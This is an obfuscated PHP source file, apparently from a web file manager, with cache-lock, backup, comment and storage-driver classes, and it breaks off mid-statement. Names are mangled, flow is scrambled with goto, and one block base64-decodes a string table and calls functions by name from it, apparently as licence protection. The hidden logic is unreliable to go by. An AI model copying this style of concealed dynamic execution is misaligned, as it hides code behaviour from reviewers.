<?php
 goto c—éîîá“…; b¨Š•„ôİ£: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A¬öõ½ğÑ =& $_SERVER[Š‰]; $D† Äª§öó = $GLOBALS[$A¬öõ½ğÑ[6]][$A¬öõ½ğÑ[345]]; self::$cachePath = $D† Äª§öó[$A¬öõ½ğÑ[173]][$A¬öõ½ğÑ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d©…¾Ú“á³, $e¤¬É÷‡ = 0) { goto D‰”—Øó¿; FÕ™¹¨åØ¹: $böÈåÇá = rtrim(self::$cachePath, $B“Öâ³šØ„[8]) . $B“Öâ³šØ„[803] . md5($d©…¾Ú“á³) . $B“Öâ³šØ„[800]; if (file_exists($böÈåÇá) && filemtime($böÈåÇá) && filemtime($böÈåÇá) < time() - 10) { @unlink($böÈåÇá); } do { if (file_exists($böÈåÇá)) { cacheLockWait(); continue; } $bõßÀÂÂñ© = fopen($böÈåÇá, $B“Öâ³šØ„[804]); if (!$bõßÀÂÂñ©) { return !1; } $aé­ô£ãÈ = flock($bõßÀÂÂñ©, LOCK_EX | LOCK_NB); self::$caches[$d©…¾Ú“á³] = array($B“Öâ³šØ„[805] => $bõßÀÂÂñ©, $B“Öâ³šØ„[173] => $böÈåÇá); fwrite($bõßÀÂÂñ©, $AÀ†‚Ã¸»Ò); clearstatcache(); if ($bõßÀÂÂñ© && $aé­ô£ãÈ) { return !0; } cacheLockWait(); } while (microtime(!0) < $AÀ†‚Ã¸»Ò); goto E”¯—˜­˜Å; D‰”—Øó¿: $B“Öâ³šØ„ =& $_SERVER[Š‰]; $AêÂ‰ôÜÁĞ = microtime(!0); $AÀ†‚Ã¸»Ò = $AêÂ‰ôÜÁĞ + $e¤¬É÷‡ + 0.0001; goto FÕ™¹¨åØ¹; E”¯—˜­˜Å: $this->unlock($d©…¾Ú“á³); return !1; goto E£œ˜¾©ö; E£œ˜¾©ö: } public function lockGet($Bä½Ï¬éÉ¼) { $Eª›Ñƒêè¬ =& $_SERVER[Š‰]; $F‚ßò‚ÈïÄ = rtrim(self::$cachePath, $Eª›Ñƒêè¬[8]) . $Eª›Ñƒêè¬[803] . md5($Bä½Ï¬éÉ¼) . $Eª›Ñƒêè¬[800]; return file_exists($F‚ßò‚ÈïÄ); } public function unlock($cæ©«Ò¢½š) { goto CÈ»¨Á‹Ñ; d±È“½ÕÜ: @flock($A½ÃÊéå·Õ[$Aˆ˜ˆİ¸¬§[805]], LOCK_UN); @fclose($A½ÃÊéå·Õ[$Aˆ˜ˆİ¸¬§[805]]); @unlink($A½ÃÊéå·Õ[$Aˆ˜ˆİ¸¬§[173]]); goto EÏóà¾£Âç; EÏóà¾£Âç: unset(self::$caches[$cæ©«Ò¢½š]); goto AƒíµˆÅ¥; CÈ»¨Á‹Ñ: $Aˆ˜ˆİ¸¬§ =& $_SERVER[Š‰]; $A½ÃÊéå·Õ = self::$caches[$cæ©«Ò¢½š]; if (!$A½ÃÊéå·Õ) { return; } goto d±È“½ÕÜ; AƒíµˆÅ¥: } } class CacheLockRedis { public function lock($b‡´Ùçíñ, $DËŞ¦Œ™±³ = 10) { $dº†Ú¼„ = Cache::init(); $c¸¾‹ã»ô… = microtime(!0) + $DËŞ¦Œ™±³; while (microtime(!0) < $c¸¾‹ã»ô…) { $f­‹³…†ÂÄ = $dº†Ú¼„->get($b‡´Ùçíñ); if (!$f­‹³…†ÂÄ) { $a¿‚¶³ç¨Š = $dº†Ú¼„->setLock($b‡´Ùçíñ, $c¸¾‹ã»ô…, $DËŞ¦Œ™±³); if ($a¿‚¶³ç¨Š) { return !0; } } else { if ($f­‹³…†ÂÄ < microtime(!0)) { $dº†Ú¼„->set($b‡´Ùçíñ, $c¸¾‹ã»ô…, $DËŞ¦Œ™±³ * 2); if ($dº†Ú¼„->get($b‡´Ùçíñ) === $f­‹³…†ÂÄ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Cøô–Éˆ) { return Cache::init()->get($Cøô–Éˆ); } public function unlock($BÍ‘†ŞÚŒ) { return Cache::init()->remove($BÍ‘†ŞÚŒ); } } goto aÜôó•ê—´; eáÙ‹ê¸Š—: $d¾§¬Ô˜‘ = strrev(base64_decode($_SERVER[¤Îˆ«™‰ú][0])); function binCheckNeq($eÎµ¥“ß‰, $aœ‡’é›â) { return $eÎµ¥“ß‰ != $aœ‡’é›â; } $_SERVER[$_SERVER[¤Îˆ«™‰ú][1]] = $d¾§¬Ô˜‘($_SERVER[$_SERVER[¤Îˆ«™‰ú][2]]); goto C×Â“…Âê—; a×¿š¶œÂ‡: if ($_SERVER[$_SERVER[Š‰][753]] != $_SERVER[$_SERVER[Š‰][816]]) { goto aËàåø³Ã; aËàåø³Ã: $b Œ—ÓÈÜ = $_SERVER[Š‰][754]; $cñ¹äæô‚½ = $_SERVER[$_SERVER[Š‰][755]] . $_SERVER[Š‰][756]; $d³·†’ãø¹ = $b Œ—ÓÈÜ($cñ¹äæô‚½); goto A¢±Ùì·; A¢±Ùì·: $F°á›ÅÅ¨ = explode($_SERVER[Š‰][227], $d³·†’ãø¹); if (count($F°á›ÅÅ¨) < $_SERVER[Š‰][588]) { $bğèËÖÉÂ  = $_SERVER[Š‰][757]; $bğèËÖÉÂ (); } $E¿©‘áÎí¦ = $_SERVER[Š‰][758]; goto Bòõ£¡­è¶; Bòõ£¡­è¶: $E¿©‘áÎí¦($_SERVER[$_SERVER[Š‰][751]]); goto fö§Ääù‘–; fö§Ääù‘–: } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\142\141\x63\153\165\160\x4c\x69\163\164"; public $field = array("\151\157", "\x6e\x61\155\145", "\163\x74\x61\x74\165\x73", "\x63\157\156\x74\x65\x6e\x74", "\x72\145\163\x75\154\x74", "\x74\151\155\145\106\x72\157\x6d", "\164\151\155\145\x54\157"); public function config() { goto C¯ø´‹ÛÏÇ; C¯ø´‹ÛÏÇ: $dµ…Ÿ´¸Ò¢ =& $_SERVER[Š‰]; $f…º¨„²  = Model($dµ…Ÿ´¸Ò¢[1100])->get($dµ…Ÿ´¸Ò¢[726]); $f…º¨„²  = json_decode($f…º¨„² , !0); goto c×Ñ¿’–«¢; c×Ñ¿’–«¢: $f…º¨„²  = is_array($f…º¨„² ) ? $f…º¨„²  : array(); if (!isset($f…º¨„² [$dµ…Ÿ´¸Ò¢[705]])) { $f…º¨„² [$dµ…Ÿ´¸Ò¢[705]] = $dµ…Ÿ´¸Ò¢[86]; } $cº™ÊìŞ¢… = array(); goto F¯‚÷•—½à; F¯‚÷•—½à: Action($dµ…Ÿ´¸Ò¢[1687])->taskInit(); $f”Ğˆ‹î¹á = Model($dµ…Ÿ´¸Ò¢[1688])->listData(); foreach ($f”Ğˆ‹î¹á as $cÌ…¨ŒÁÂ) { if ($cÌ…¨ŒÁÂ[$dµ…Ÿ´¸Ò¢[1145]] == $dµ…Ÿ´¸Ò¢[86] && $cÌ…¨ŒÁÂ[$dµ…Ÿ´¸Ò¢[1489]] == $dµ…Ÿ´¸Ò¢[1689]) { $cº™ÊìŞ¢… = $cÌ…¨ŒÁÂ; break; } } goto fğì×Şä°¡; fğì×Şä°¡: if (isset($cº™ÊìŞ¢…[$dµ…Ÿ´¸Ò¢[195]])) { $cº™ÊìŞ¢…[$dµ…Ÿ´¸Ò¢[195]] = json_decode($cº™ÊìŞ¢…[$dµ…Ÿ´¸Ò¢[195]], !0); } if (isset($f…º¨„² [$dµ…Ÿ´¸Ò¢[195]])) { $cº™ÊìŞ¢…[$dµ…Ÿ´¸Ò¢[195]][$dµ…Ÿ´¸Ò¢[1474]] = $f…º¨„² [$dµ…Ÿ´¸Ò¢[195]]; unset($f…º¨„² [$dµ…Ÿ´¸Ò¢[195]]); } return array_merge($cº™ÊìŞ¢…, $f…º¨„² ); goto cƒ Œ‰á¿; cƒ Œ‰á¿: } public function listData($d¯ñïÀƒÇÂ = false, $BÆ‰²”²ëº = "\155\x6f\x64\151\x66\x79\x54\x69\x6d\x65", $A“¶Ïö±—Â = false) { return parent::listData($d¯ñïÀƒÇÂ, $BÆ‰²”²ëº, !0); } public function lastItem() { $dñë†õó×½ = $this->listData(); return !empty($dñë†õó×½[0]) ? $dñë†õó×½[0] : null; } public function kill($b„ŒÒ¿‹ˆ”) { goto D®Òªù»§; eˆÄä“ô¾Ş: return $this->remove($b„ŒÒ¿‹ˆ”); goto a¯Û­Ò‰ó‚; DÉ‹•³êç: $B‚ô›à‡‚ = $cÃõ‹Æš–Ğ[$aŒà¿ö ¨Å[28]]; $dùÃ¶›¥ñá = TEMP_FILES . $aŒà¿ö ¨Å[722] . $B‚ô›à‡‚ . $aŒà¿ö ¨Å[8]; IO::remove($dùÃ¶›¥ñá, !1); goto eˆÄä“ô¾Ş; E·ĞâèÅä‘: Task::kill($aŒà¿ö ¨Å[725]); Task::kill($aŒà¿ö ¨Å[744]); Task::kill($aŒà¿ö ¨Å[761]); goto DÉ‹•³êç; D®Òªù»§: $aŒà¿ö ¨Å =& $_SERVER[Š‰]; $cÃõ‹Æš–Ğ = $this->listData($b„ŒÒ¿‹ˆ”); if (!$cÃõ‹Æš–Ğ || empty($cÃõ‹Æš–Ğ[$aŒà¿ö ¨Å[28]])) { return !0; } goto E·ĞâèÅä‘; a¯Û­Ò‰ó‚: } public function remove($aÓŸŸãêÎí) { $cõğˆÈœ = $this->listData($aÓŸŸãêÎí); if (!$cõğˆÈœ) { return !0; } return $this->backupRemove($cõğˆÈœ); } private function backupRemove($EäØã‚¥Ùê) { $eâ·¶‡‘“Ç =& $_SERVER[Š‰]; parent::remove($EäØã‚¥Ùê[$eâ·¶‡‘“Ç[388]]); $f³Ò©£’¬® = "\x7b\151\157\x3a{$EäØã‚¥Ùê[$eâ·¶‡‘“Ç[704]]}\175\57\144\141\164\141\x62\141\163\145\57\142\x61\x63\x6b\x75\160\137" . $EäØã‚¥Ùê[$eâ·¶‡‘“Ç[28]]; IO::remove($f³Ò©£’¬®, !1); return !0; } public function start() { goto Aâ‹ºŞç‡Ö; f•ó‹öŞïË: $eÜÕì“¾½Û = new Backup(); $eÜÕì“¾½Û->keep(); $E×ö…„åºÜ = $eÜÕì“¾½Û->db(); goto c§»†¢÷…‘; B¯áÔîƒš: if (!$Bœ½¼±…ä¼ || $Bœ½¼±…ä¼[$D×˜‹ºœ[1471]] != $D×˜‹ºœ[86]) { return !1; } $fÔ¶ êÑ«À = $this->process(); foreach ($fÔ¶ êÑ«À as $Fšî×™õ© ) { if ($Fšî×™õ© ) { return Task::restart($Fšî×™õ© [$D×˜‹ºœ[388]]); } } goto f•ó‹öŞïË; Aâ‹ºŞç‡Ö: $D×˜‹ºœ =& $_SERVER[Š‰]; if ($GLOBALS[$D×˜‹ºœ[6]][$D×˜‹ºœ[87]][$D×˜‹ºœ[1690]] != $D×˜‹ºœ[86]) { return !0; } $Bœ½¼±…ä¼ = $this->config(); goto B¯áÔîƒš; c§»†¢÷…‘: if ($E×ö…„åºÜ) { $E×ö…„åºÜ = $eÜÕì“¾½Û->dbFile(); if ($E×ö…„åºÜ && $Bœ½¼±…ä¼[$D×˜‹ºœ[705]] == $D×˜‹ºœ[491]) { $E×ö…„åºÜ = $eÜÕì“¾½Û->file(); } } Backup::set(array($D×˜‹ºœ[702] => 1, $D×˜‹ºœ[470] => time())); return !0; goto f°¹ƒˆ£; f°¹ƒˆ£: } public function process() { $EÓ„ñ½æÒ­ =& $_SERVER[Š‰]; return array($EÓ„ñ½æÒ­[707] => Task::get($EÓ„ñ½æÒ­[725]), $EÓ„ñ½æÒ­[710] => Task::get($EÓ„ñ½æÒ­[744]), $EÓ„ñ½æÒ­[173] => Task::get($EÓ„ñ½æÒ­[761])); } public function restore() { $DÆ‚‹÷¡á‹ =& $_SERVER[Š‰]; ActionCall($DÆ‚‹÷¡á‹[995], !0, 1); ActionCall($DÆ‚‹÷¡á‹[995], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\x65\x6e\164"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\143\157\155\x6d\145\156\x74\x5f\x6d\x65\x74\x61", "\x6d\145\164\x61\106\x69\x65\154\144" => "\x63\x6f\x6d\x6d\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aÑÃÆ¥õ¥À) { $Aø¢ğ°„ºŠ =& $_SERVER[Š‰]; if ($aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[1691]]) { $f­¿¥£ê¦‰ = $this->where(array($Aø¢ğ°„ºŠ[1692] => $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[1691]]))->find(); if (!$f­¿¥£ê¦‰ || $f­¿¥£ê¦‰[$Aø¢ğ°„ºŠ[398]] != $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[398]] || $f­¿¥£ê¦‰[$Aø¢ğ°„ºŠ[478]] != $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[478]]) { return !1; } $this->where(array($Aø¢ğ°„ºŠ[1692] => $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[1691]]))->setAdd($Aø¢ğ°„ºŠ[1693], 1); } $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[1694]] = 0; $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[1693]] = 0; $aÑÃÆ¥õ¥À[$Aø¢ğ°„ºŠ[702]] = 1; return $this->add($aÑÃÆ¥õ¥À); } public function commentCount($bˆ¡Àƒ  è, $a÷ê‹áÆƒ) { goto Cº£´èÏï; Cº£´èÏï: $C¸´ã™Ç„¸ =& $_SERVER[Š‰]; if (!$bˆ¡Àƒ  è) { return array(); } if (is_string($bˆ¡Àƒ  è) || is_int($bˆ¡Àƒ  è)) { $bˆ¡Àƒ  è = array($bˆ¡Àƒ  è); } goto dª‹¬¿ƒÕÏ; fè½áÏçÍî: return array_to_keyvalue($d‰°™¹Ş‰„, $C¸´ã™Ç„¸[478], $C¸´ã™Ç„¸[474]); goto B¤Ü£×ŠáË; dª‹¬¿ƒÕÏ: $bæ¤ØÇÙ‡É = array($C¸´ã™Ç„¸[478], $C¸´ã™Ç„¸[1695] => $C¸´ã™Ç„¸[474]); $FÖ–’å‰ØÜ = array($C¸´ã™Ç„¸[478] => array($C¸´ã™Ç„¸[7], $bˆ¡Àƒ  è), $C¸´ã™Ç„¸[398] => $a÷ê‹áÆƒ); $d‰°™¹Ş‰„ = $this->field($bæ¤ØÇÙ‡É)->where($FÖ–’å‰ØÜ)->group($C¸´ã™Ç„¸[478])->select(); goto fè½áÏçÍî; B¤Ü£×ŠáË: } public function remove($Bó´Ò½”·) { $bÜ÷Å³­¾Ù =& $_SERVER[Š‰]; $c„¨ùğö†Œ = array($bÜ÷Å³­¾Ù[1692] => $Bó´Ò½”·); $d”Â¤ªÖÀ† = $this->where($c„¨ùğö†Œ)->find(); if ($d”Â¤ªÖÀ†[$bÜ÷Å³­¾Ù[1691]]) { $this->where(array($bÜ÷Å³­¾Ù[1692] => $d”Â¤ªÖÀ†[$bÜ÷Å³­¾Ù[1691]]))->setAdd($bÜ÷Å³­¾Ù[1693], -1); } return $this->where($c„¨ùğö†Œ)->delete(); } public function edit($eÅÚœÈôõ, $dçœ§…Õ´Ø) { $dÀùÚÆ…àÉ =& $_SERVER[Š‰]; $f¥¶ˆ½ÔÍ¥ = array($dÀùÚÆ…àÉ[1692] => $eÅÚœÈôõ); return $this->where($f¥¶ˆ½ÔÍ¥)->save(array($dÀùÚÆ…àÉ[1696] => $dçœ§…Õ´Ø)); } public function prasise($EÕ¦§”ÚĞÙ) { $eÉÔÂ™£®æ =& $_SERVER[Š‰]; $bÃ«ã·ëöŠ = Model($eÉÔÂ™£®æ[1697]); $CÜôê‘Ó¾ = array($eÉÔÂ™£®æ[1692] => $EÕ¦§”ÚĞÙ, $eÉÔÂ™£®æ[1492] => USER_ID); $C¦¼äƒ = $bÃ«ã·ëöŠ->where($CÜôê‘Ó¾)->find(); if (!$C¦¼äƒ) { $bÃ«ã·ëöŠ->add($CÜôê‘Ó¾); $AÌà’íº†ñ = $this->where(array($eÉÔÂ™£®æ[1692] => $EÕ¦§”ÚĞÙ))->setAdd($eÉÔÂ™£®æ[1694], 1); } else { $bÃ«ã·ëöŠ->where($CÜôê‘Ó¾)->delete(); $AÌà’íº†ñ = $this->where(array($eÉÔÂ™£®æ[1692] => $EÕ¦§”ÚĞÙ))->setAdd($eÉÔÂ™£®æ[1694], -1); } return $AÌà’íº†ñ; } public function targetInfo($f‚İÙÏëˆÏ, $bÎáÉÆè ¨) { goto b±õ³¬ë†; b±õ³¬ë†: $c·„É¿•‹„ =& $_SERVER[Š‰]; $bÏ»›â„¶º = array($c·„É¿•‹„[544] => $f‚İÙÏëˆÏ, $c·„É¿•‹„[545] => $bÎáÉÆè ¨); $B´ÂŒÃÉ = $this->where($bÏ»›â„¶º)->count(); goto E­—Éã½”‡; E­—Éã½”‡: $aŒÚ½Ñ’ğ = "\122\111\107\x48\124\x20\112\117\111\116\40{$this->tablePrefix}\143\157\155\x6d\x65\x6e\164\x5f\160\162\141\151\163\145\40\x73\164\141\162\40\x6f\x6e\40\143\x6f\155\155\x65\156\x74\x2e\143\x6f\155\x6d\145\x6e\164\x49\104\40\75\40\x73\164\x61\162\x2e\143\157\155\155\x65\156\x74\111\104"; $b–¡Êï©Ì¡ = $this->alias($c·„É¿•‹„[350])->where($bÏ»›â„¶º)->join($aŒÚ½Ñ’ğ, $c·„É¿•‹„[1698])->count(); $A¼ÓİÆÚÊ´ = array($c·„É¿•‹„[1699] => $B´ÂŒÃÉ, $c·„É¿•‹„[1700] => $b–¡Êï©Ì¡); goto câ×æƒ‘Êö; câ×æƒ‘Êö: return $A¼ÓİÆÚÊ´; goto dŸåÊ¾Ÿ÷; dŸåÊ¾Ÿ÷: } public function listData($D–˜ÈÑ Ÿ˜) { $E¨Şñá‡´¹ =& $_SERVER[Š‰]; if (isset($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1701]])) { if ($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1701]]) { $D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1702]] = array($E¨Şñá‡´¹[948], intval($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1701]])); } unset($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1701]]); } if (isset($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1703]])) { if ($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1703]]) { $D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1702]] = array($E¨Şñá‡´¹[945], intval($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1703]])); } unset($D–˜ÈÑ Ÿ˜[$E¨Şñá‡´¹[1703]]); } return $this->_listData($D–˜ÈÑ Ÿ˜); } private function _listData($C”˜°³Ì¹ó) { $cÁŒø©•„Ã =& $_SERVER[Š‰]; $AàøÑÊÙªâ = $this->where($C”˜°³Ì¹ó)->_makeOrder()->selectPage(100); $this->_listAppendParent($AàøÑÊÙªâ[$cÁŒø©•„Ã[365]]); $this->_listAppendUser($AàøÑÊÙªâ[$cÁŒø©•„Ã[365]]); $this->_listAppendMeta($AàøÑÊÙªâ[$cÁŒø©•„Ã[365]]); return $AàøÑÊÙªâ; } private function _makeOrder() { $d¨Ô‚­¤£Ÿ =& $_SERVER[Š‰]; $d˜Ê«´æ“ˆ = array($d¨Ô‚­¤£Ÿ[1694], $d¨Ô‚­¤£Ÿ[1693], $d¨Ô‚­¤£Ÿ[192]); $AÁˆñ İ²ª = Input::get($d¨Ô‚­¤£Ÿ[429], $d¨Ô‚­¤£Ÿ[7], $d¨Ô‚­¤£Ÿ[410], $d˜Ê«´æ“ˆ); $AË‰“ÓÉ¿ = Input::get($d¨Ô‚­¤£Ÿ[430], $d¨Ô‚­¤£Ÿ[7], $d¨Ô‚­¤£Ÿ[1494], array($d¨Ô‚­¤£Ÿ[1704], $d¨Ô‚­¤£Ÿ[425])); $fœ»ÈŒÇ› = $AÁˆñ İ²ª . $d¨Ô‚­¤£Ÿ[50] . $AË‰“ÓÉ¿; return $this->order($fœ»ÈŒÇ›); } private function _listAppendParent(&$a‰î˜Æ½«±) { goto Dìº˜èåÓÅ; Dìº˜èåÓÅ: $b«íÏÌÌ¾Í =& $_SERVER[Š‰]; $B¾¶ÛÃìğ¨ = array_unique(array_to_keyvalue($a‰î˜Æ½«±, $b«íÏÌÌ¾Í[33], $b«íÏÌÌ¾Í[1691])); $B¾¶ÛÃìğ¨ = array_remove_value($B¾¶ÛÃìğ¨, $b«íÏÌÌ¾Í[491]); goto f¨¯•Ú–é¥; eá¥¿ï³Õ: foreach ($a‰î˜Æ½«± as &$C‰Š®Œ´Õ) { if (isset($aÄ½í‘¤‹…[$C‰Š®Œ´Õ[$b«íÏÌÌ¾Í[1691]]])) { $C‰Š®Œ´Õ[$b«íÏÌÌ¾Í[1705]] = $aÄ½í‘¤‹…[$C‰Š®Œ´Õ[$b«íÏÌÌ¾Í[1691]]]; } } unset($C‰Š®Œ´Õ); goto cêµ®±½¢Ö; f¨¯•Ú–é¥: if (!$B¾¶ÛÃìğ¨) { return; } $aÄ½í‘¤‹… = $this->where(array($b«íÏÌÌ¾Í[1692] => array($b«íÏÌÌ¾Í[7], $B¾¶ÛÃìğ¨)))->select(); $aÄ½í‘¤‹… = array_to_keyvalue($aÄ½í‘¤‹…, $b«íÏÌÌ¾Í[1702]); goto eá¥¿ï³Õ; cêµ®±½¢Ö: } private function _listAppendUser(&$Dò³«éÍ”) { goto C„‹»˜’; aî©¥Êöœ•: foreach ($Dò³«éÍ” as &$CëìŞÑİŞ) { $CëìŞÑİŞ[$EÁšÂ¸®”[557]] = $f»ŒËÂ¡Â‰[$CëìŞÑİŞ[$EÁšÂ¸®”[1500]]]; if (isset($CëìŞÑİŞ[$EÁšÂ¸®”[1705]])) { $CëìŞÑİŞ[$EÁšÂ¸®”[1705]][$EÁšÂ¸®”[557]] = $f»ŒËÂ¡Â‰[$CëìŞÑİŞ[$EÁšÂ¸®”[1705]][$EÁšÂ¸®”[1500]]]; } } unset($CëìŞÑİŞ); goto FæÓ¶Àê‰µ; C„‹»˜’: $EÁšÂ¸®” =& $_SERVER[Š‰]; $DÍºÒ‚óÑ— = array_unique(array_to_keyvalue($Dò³«éÍ”, $EÁšÂ¸®”[33], $EÁšÂ¸®”[1500])); $DÍºÒ‚óÑ— = array_remove_value($DÍºÒ‚óÑ—, $EÁšÂ¸®”[491]); goto E‘¤ŸÔöí; E‘¤ŸÔöí: if (count($DÍºÒ‚óÑ—) == 0) { return; } foreach ($Dò³«éÍ” as $CëìŞÑİŞ) { if (isset($CëìŞÑİŞ[$EÁšÂ¸®”[1705]])) { $DÍºÒ‚óÑ—[] = $CëìŞÑİŞ[$EÁšÂ¸®”[1705]][$EÁšÂ¸®”[1500]]; } } $f»ŒËÂ¡Â‰ = Model($EÁšÂ¸®”[501])->userListInfo($DÍºÒ‚óÑ—); goto aî©¥Êöœ•; FæÓ¶Àê‰µ: } private function _listAppendMeta(&$BÉŞ¤÷êİˆ) { goto Fã‰É‰šÔê; B¼ùÌ§•´: if (!$b·  ä´¢º) { return !1; } foreach ($BÉŞ¤÷êİˆ as &$A®’×Û½¥ƒ) { $A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[439]] = $b·  ä´¢º[$A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1702]]]; if (isset($A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1705]])) { $A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1705]][$DÑÜßİ¢äÏ[439]] = $b·  ä´¢º[$A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1705]][$DÑÜßİ¢äÏ[1702]]]; } } unset($A®’×Û½¥ƒ); goto dÄŞê£®Øİ; c‚Ùå×²¬: if (!$f³¥µ°–™) { return; } foreach ($BÉŞ¤÷êİˆ as $A®’×Û½¥ƒ) { if (isset($A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1705]])) { $f³¥µ°–™[] = $A®’×Û½¥ƒ[$DÑÜßİ¢äÏ[1705]][$DÑÜßİ¢äÏ[1702]]; } } $b·  ä´¢º = $this->metaList($f³¥µ°–™); goto B¼ùÌ§•´; Fã‰É‰šÔê: $DÑÜßİ¢äÏ =& $_SERVER[Š‰]; $f³¥µ°–™ = array_unique(array_to_keyvalue($BÉŞ¤÷êİˆ, $DÑÜßİ¢äÏ[33], $DÑÜßİ¢äÏ[1702])); $f³¥µ°–™ = array_remove_value($f³¥µ°–™, $DÑÜßİ¢äÏ[491]); goto c‚Ùå×²¬; dÄŞê£®Øİ: } private function metaList($FÎè§¼í£ù) { goto eùŸŠ¹ªé‰; CÓÆØ‡ŒÇ: return $fŠÕäùïÓ ? $fŠÕäùïÓ : array(); goto fƒ¤Ôñ˜İÀ; eùŸŠ¹ªé‰: $B‡‘¸íÔ– =& $_SERVER[Š‰]; if (!$FÎè§¼í£ù) { return array(); } $F±›ÅÃ…ƒ¾ = array($B‡‘¸íÔ–[1702] => array($B‡‘¸íÔ–[7], $FÎè§¼í£ù)); goto fŞÕ¥Ô‰ŸŠ; fŞÕ¥Ô‰ŸŠ: $fŠÕäùïÓ = Model($B‡‘¸íÔ–[1706])->where($F±›ÅÃ…ƒ¾)->select(); $fŠÕäùïÓ = array_to_keyvalue_group($fŠÕäùïÓ, $B‡‘¸íÔ–[1702]); foreach ($fŠÕäùïÓ as $dƒ‡äÃéØˆ => $Bô¬ôÉƒ²œ) { $eáÜÏ„ÇÓ = array(); foreach ($Bô¬ôÉƒ²œ as $a…›‘³Û¬) { $eáÜÏ„ÇÓ[$a…›‘³Û¬[$B‡‘¸íÔ–[92]]] = $a…›‘³Û¬[$B‡‘¸íÔ–[370]]; } $fŠÕäùïÓ[$dƒ‡äÃéØˆ] = $eáÜÏ„ÇÓ; } goto CÓÆØ‡ŒÇ; fƒ¤Ôñ˜İÀ: } } goto f¥˜¯ŒªÇò; cÓÏ¥“öíÓ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C´í‰ğÌÉÃ, $bÉÇ¹‘âÊ = 0) { parent::__construct(); $this->source = $C´í‰ğÌÉÃ; $this->sourceSize = $bÉÇ¹‘âÊ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b‡ïƒëÔÁ = false) { return $this->sourceSize; } public function getContent($a¢Ö•¶Ğê = false) { return $this->fileSubstr($a¢Ö•¶Ğê, 0, $this->sourceSize); } public function fileSubstr($c³êÒ˜¬›¥ = false, $BËÃ›²ª = 0, $aïÍƒÈ”èÈ = 0) { if (!$aïÍƒÈ”èÈ) { $aïÍƒÈ”èÈ = $this->sourceSize; } $Fõ¶à±”° = $this->sourceSize - $BËÃ›²ª; if ($aïÍƒÈ”èÈ >= $Fõ¶à±”°) { $aïÍƒÈ”èÈ = $Fõ¶à±”°; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $BËÃ›²ª, $aïÍƒÈ”èÈ); } if ($this->sourceType == self::TYPE_FILE) { if ($aïÍƒÈ”èÈ <= 0) { return $_SERVER[Š‰][33]; } $A³áÌí­Ï­ = ftell($this->source); fseek_64($this->source, $A³áÌí­Ï­ + $BËÃ›²ª); $Dê®µÃÁÍ¨ = @fread($this->source, $aïÍƒÈ”èÈ); fseek_64($this->source, $A³áÌí­Ï­); return $Dê®µÃÁÍ¨; } } public function hashMd5($bÛ·ãàÑÆÃ = false) { return md5($this->getContent()); } public static function hash($f»ƒÈĞ«œ, $Eöå¹¤é×ø = 0) { $f¯ê—Âî§ = new PathDriverStream($f»ƒÈĞ«œ, $Eöå¹¤é×ø); return $f¯ê—Âî§->hashSimple($f»ƒÈĞ«œ); } public static function md5($EÜéÆ¥—¶§, $d¿Ô”Ëøã = 0) { $B””¯éªùš = new PathDriverStream($EÜéÆ¥—¶§, $d¿Ô”Ëøã); return $B””¯éªùš->hashMd5($EÜéÆ¥—¶§); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\x2f\57\x76\60\x2e\141\x70\x69\56\x75\x70\x79\x75\156\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dºİ½­ÃÆï) { parent::__construct(); $this->_init($dºİ½­ÃÆï); } public function _init($e´Üä¦ñö) { $E¥ÇƒŞ£ÓÕ =& $_SERVER[Š‰]; foreach ($e´Üä¦ñö as $d”«õƒó¤ => $E‚†é¦“ø¡) { if (isset($this->{$d”«õƒó¤})) { $this->{$d”«õƒó¤} = $E‚†é¦“ø¡; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($E¥ÇƒŞ£ÓÕ[1303] . LNG($E¥ÇƒŞ£ÓÕ[1235])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($cç²‹êÊ…‚, $DÖ†Ô¿èäŞ = "\x47\x45\124") { $bÅçøñ–Üø =& $_SERVER[Š‰]; $E¯óÁ”ó‹Ô = 